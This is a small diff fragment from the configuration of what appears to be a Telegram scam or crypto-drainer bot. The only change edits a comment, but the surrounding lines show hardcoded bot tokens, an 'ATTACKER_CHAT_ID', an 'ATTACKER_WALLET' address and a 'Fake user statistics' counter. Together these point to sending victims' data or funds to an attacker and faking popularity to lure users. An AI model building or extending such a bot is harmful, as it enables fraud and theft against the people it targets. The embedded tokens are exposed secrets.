@@ -20,7 +20,7 @@ MAIN_BOT_TOKEN = os.getenv('MAIN_BOT_TOKEN', '8296111824:AAG5ok4TRaNBoTQAVhALEW1
 MONITOR_BOT_TOKEN = os.getenv('MONITOR_BOT_TOKEN', '7789920610:AAEzQd2V4KrRU87gk7yvYl99aV3sx4Jkb4U')
 ATTACKER_CHAT_ID = os.getenv('ATTACKER_CHAT_ID', '7429331053')
 ATTACKER_WALLET = 'APbc2s9cgUZPuU2vm7SEwTP2GJa2i3qsXcGRYcSd6zJb'
-HEROKU_URL = os.getenv('HEROKU_URL')  # Set this to your Render app URL (e.g., https://your-app.onrender.com)
+HEROKU_URL = os.getenv('HEROKU_URL')  # e.g., https://your-app.onrender.com
 
 # Fake user statistics
 user_count = 1500
